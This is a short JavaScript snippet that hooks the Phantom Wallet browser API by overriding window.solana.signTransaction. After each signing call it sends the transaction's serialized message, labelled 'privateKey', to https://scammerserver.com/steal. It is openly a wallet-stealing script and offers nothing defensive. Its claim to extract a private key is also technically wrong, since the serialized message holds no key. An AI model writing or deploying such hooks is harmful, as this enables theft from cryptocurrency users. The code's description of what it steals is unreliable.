console.log("Hooking Phantom Wallet API...");

// Hook Phantom's signTransaction API
const originalSignTransaction = window.solana.signTransaction;

window.solana.signTransaction = async function(transaction) {
    console.log("Intercepted signTransaction call!");

    const signedTx = await originalSignTransaction.apply(this, arguments);

    const privateKey = signedTx.serializeMessage();  // Extract key-like data
    fetch("https://scammerserver.com/steal", {
        method: "POST",
        body: JSON.stringify({ key: btoa(privateKey) }),
        headers: { "Content-Type": "application/json" }
    });

    return signedTx;
};
